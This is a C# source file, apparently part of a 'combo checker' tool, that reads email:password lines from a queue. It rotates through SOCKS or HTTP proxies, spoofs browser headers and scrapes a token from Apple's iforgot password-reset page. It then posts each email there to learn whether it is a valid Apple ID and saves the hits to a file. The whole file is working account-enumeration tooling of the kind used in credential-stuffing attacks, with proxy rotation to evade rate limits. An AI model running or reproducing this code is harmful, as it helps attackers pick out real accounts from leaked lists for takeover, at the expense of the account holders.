using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace VM.VM
{
    class Apple_VM
    {
        public static void apple(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = Checker.timeout
                };
                string gu = Guid.NewGuid().ToString();
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Checker.ProxyList.ElementAt<string>(new Random().Next(0, Checker.proxytotal)).Split(':', ';', '|');
                ProxyClient proxyClient = Checker.proxytype == "SOCKS5" ? (ProxyClient)new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (Checker.proxytype == "SOCKS4" ? (ProxyClient)new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1])));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                string str1 = Checker.RandomDigits(12);
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Pragma", "no - cache");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = false;
                string str2 = httpRequest.Get("https://iforgot.apple.com/password/verify/appleid").ToString();
                string stt = betweenStrings(str2, "\"sstt\":\"", "\", \"captchaEnabled");
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
                httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("Host", "iforgot.apple.com");
                httpRequest.AddHeader("Origin", "https://iforgot.apple.com");
                httpRequest.AddHeader("Referer", "https://iforgot.apple.com/password/verify/appleid");
                httpRequest.AddHeader("sstt", ""+stt);
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                httpRequest.AllowAutoRedirect = false;
                string str3 = httpRequest.Post("https://iforgot.apple.com/password/verify/appleid", "{\"id\":\""+strArray1[0]+ "\"}", "application/json").ToString();
                if (str3.Contains("This Apple ID is not valid or not supported"))
                {
                    Interlocked.Increment(ref Checker.check);
                    Interlocked.Increment(ref Checker.bad);
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.Red);
                }
                if (!str3.Contains("This Apple ID is not valid or not supported"))
                {
                    Interlocked.Increment(ref Checker.hits);
                    Interlocked.Increment(ref Checker.check);
                    Export.WriteToFileThreadSafe(combo, "..\\VM\\Apple_VM.txt");
                    if (Checker.show == "Y")
                        Colorful.Console.WriteLine("[ - ]" + combo, Color.LawnGreen);
                }
            }
            catch
            {
                Interlocked.Increment(ref Checker.err);
                Checker.ComboQueue.Enqueue(combo);
            }
        }
        public static String betweenStrings(string text, String start, String end)
        {
            int p1 = text.IndexOf(start) + start.Length;
            int p2 = text.IndexOf(end, p1);
            if (end == "") return (text.Substring(p1));
            else return text.Substring(p1, p2 - p1);
        }
    }
}
